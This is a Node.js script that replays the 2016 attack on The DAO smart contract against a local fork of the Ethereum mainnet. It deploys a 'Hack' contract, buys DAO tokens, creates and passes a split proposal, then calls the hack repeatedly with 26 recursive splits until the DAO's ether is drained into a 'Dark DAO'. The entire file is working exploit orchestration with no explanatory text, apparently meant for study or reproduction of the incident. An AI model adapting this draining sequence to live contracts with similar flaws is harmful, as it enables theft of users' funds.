#!/usr/bin/env node

var TestRPC = require("ethereumjs-testrpc");
var Web3 = require("web3");
var async = require("async");
var moment = require("moment");
var align = require("./aligner.js");

var DAOContract = require("./build/contracts/DAO.sol.js");
var HackContract = require("./build/contracts/Hack.sol.js");

console.log("Forking from block 1599207...");

var web3 = new Web3(TestRPC.provider({
  fallback: "http://localhost:8545",
  fallback_block_number: 1599207,
  // DAO closing time: 1464426000 (resolution in seconds)
  startTime: new Date('Sat May 28 2016 00:00:00 GMT-0700'),
  seed: "asdf", // Make TestRPC deterministic
  //verbose: true,
  //logger: console
}));

web3.eth.getAccounts(function(err, accounts) {
  // Setup contract abstractions for ease of use.
  [DAOContract, HackContract].forEach(function(contract) {
    contract.setProvider(web3.currentProvider);
    contract.defaults({
      gas: 4e6,
      from: accounts[0]
    })
  });

  var DAO = DAOContract.at("0xbb9bc244d798123fde783fcc1c72d3bb8c189413");
  var Hack;
  var proxyAddress;
  var NewDarkDAO;

  var rewardAccountAddress = "0xd2e16a20dd7b1ae54fb0312209784478d069c7b0";

  var balances;
  var proposalID;

  var etherForPreSale = 90;
  var splitCallsToMake = 26;

  async.series([
    deployHackContract,
    participateInPresale,
    checkBalances,
    jump("1 day"), // Wait for closing period to end
    transferDAOToHackContract,
    checkBalances,
    makeSplitProposal,
    voteYesOnProposal,
    jump("8 days"),
    splitDAO,
    checkBalances,
    runHackOnLoop
  ], function(err) {
    if (err) {
      console.log(err);
      process.exit(1);
    }
    process.exit(0)
  });

  function jump(duration) {
    return function(callback) {
      console.log("Jumping " + duration + "...");

      var params = duration.split(" ");
      params[0] = parseInt(params[0])

      var seconds = moment.duration.apply(moment, params).asSeconds();

      web3.currentProvider.sendAsync({
        jsonrpc: "2.0",
        method: "evm_increaseTime",
        params: [seconds],
        id: new Date().getTime()
      }, callback);
    }
  }

  function participateInPresale(callback) {
    console.log("Buying into presale...");

    web3.eth.sendTransaction({
      from: accounts[0],
      to: DAO.address,
      value: web3.toWei(etherForPreSale, "Ether"),
      gas: 90000
    }, callback);
  }

  function deployHackContract(callback) {
    console.log("Deploying hack contract...");
    HackContract.new(DAO.address).then(function(hack) {
      Hack = hack;
      return Hack.proxy();
    }).then(function(v) {
      proxyAddress = v;
      callback();
    }).catch(callback)
  }

  function transferDAOToHackContract(callback) {
    DAO.transfer(Hack.address, balances.accountDAO).then(function() {
      callback();
    }).catch(callback);
  }

  function checkBalances(callback) {
    var getDAOBalance = function(DAOAddress, address, cb) {
      var dao = DAOContract.at(DAOAddress);
      dao.balanceOf(address).then(function(balance) {
        cb(null, balance);
      }).catch(callback);
    };

    var getTotalSupply = function(DAOAddress, cb) {
      var dao = DAOContract.at(DAOAddress);
      dao.totalSupply().then(function(supply) {
        cb(null, supply);
      }).catch(cb);
    }

    var humanizeDAOBalance = function(balance) {
      return (web3.fromWei(balance) * 10).toFixed(2)
    };

    var NewDarkDAOAddress = NewDarkDAO != null ? NewDarkDAO.address : "0x0000000000000000000000000000000000000001";

    async.parallel({
      accountETH: web3.eth.getBalance.bind(web3.eth, accounts[0]),
      accountDAO: getDAOBalance.bind(null, DAO.address, accounts[0]),
      hackDAO: getDAOBalance.bind(null, DAO.address, Hack.address),
      proxyDAO: getDAOBalance.bind(null, DAO.address, proxyAddress),
      DAOSupply: getTotalSupply.bind(null, DAO.address),
      darkDAOSupply: getTotalSupply.bind(null, NewDarkDAOAddress),
      hackDarkDAO: getDAOBalance.bind(null, NewDarkDAOAddress, Hack.address),
      DAOETH: web3.eth.getBalance.bind(web3.eth, DAO.address),
      darkDAOETH: web3.eth.getBalance.bind(web3.eth, NewDarkDAOAddress)
    }, function(err, results) {
      if (err) return callback(err);

      balances = results;

      var accountETH    = web3.fromWei(balances.accountETH).toFixed(2);
      var accountDAO    = humanizeDAOBalance(balances.accountDAO);
      var hackDAO       = humanizeDAOBalance(balances.hackDAO);
      var proxyDAO      = humanizeDAOBalance(balances.proxyDAO);
      var DAOSupply     = humanizeDAOBalance(balances.DAOSupply);
      var darkDAOSupply = humanizeDAOBalance(balances.darkDAOSupply);
      var DAOETH        = web3.fromWei(balances.DAOETH).toFixed(2);
      var darkDAOETH    = web3.fromWei(balances.darkDAOETH).toFixed(2);

      console.log("")
      align({
        "  Account": accountDAO + " DAO",
        "  Hack Contract": hackDAO + " DAO",
        "  Proxy Contract": proxyDAO + " DAO",
        "  DAO Total Supply": DAOSupply + " DAO",
        "  Dark DAO Total Supply": darkDAOSupply + " DAO",
        "  DAO ETH": DAOETH + " ETH",
        "  Dark DAO ETH": darkDAOETH + " ETH"
      });
      console.log("")

      callback();
    });
  }

  function makeSplitProposal(callback) {
    console.log("Making split proposal...");

    var event = DAO.ProposalAdded().watch(function(err, result) {
      event.stopWatching();

      if (err) {
        return callback(err);
      }

      proposalID = result.args.proposalID;

      callback()
    });

    // 1 week = 604800
    //DAO.newProposal(accounts[0], 0, "Lonely, so Lonely", 0, 604800, true);
    Hack.makeSplitProposal().then(function() {

    }).catch(callback);
  }

  function voteYesOnProposal(callback) {
    console.log("Voting yes on proposal " + proposalID + "...");
    //DAO.vote(proposalID, true).then(function() {
    Hack.voteYesOnProposal().then(function() {
      callback();
    }).catch(callback);
  }

  function splitDAO(callback) {
    console.log("Splitting to new DAO...");

    var event = DAO.Transfer().watch(function(err, result) {
      if (err) return callback(err);
      event.stopWatching();
      getNewDAO(callback);
    });

    Hack.splitDAO(function() {
      //callback();
    }).catch(callback);
  }

  function getNewDAO(callback) {
    DAO.getNewDAOAddress(proposalID).then(function(address) {
      NewDarkDAO = DAOContract.at(address);
      callback();
    }).catch(callback)
  }

  function runHackOnLoop(callback) {
    async.whilst(function() {
      return balances.DAOETH > 0;
    }, runHack, callback)
  }

  function runHack(callback) {
    console.log("Running hack transaction (" + splitCallsToMake + " splits)...");
    Hack.runHack(splitCallsToMake).then(function() {
      checkBalances(callback);
    }).catch(callback)
  }


});
